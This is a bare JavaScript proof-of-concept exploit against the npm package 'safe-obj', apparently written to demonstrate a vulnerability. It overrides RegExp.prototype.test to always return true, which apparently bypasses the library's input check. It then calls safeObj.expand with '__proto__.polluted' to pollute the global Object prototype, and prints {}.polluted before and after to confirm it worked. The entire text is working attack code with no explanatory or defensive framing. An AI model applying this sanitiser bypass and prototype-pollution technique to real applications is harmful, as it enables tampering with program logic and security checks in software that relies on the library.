RegExp.prototype.test = () => true;
var safeObj = require('safe-obj');
obj = {};
console.log({}.polluted);
safeObj.expand(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);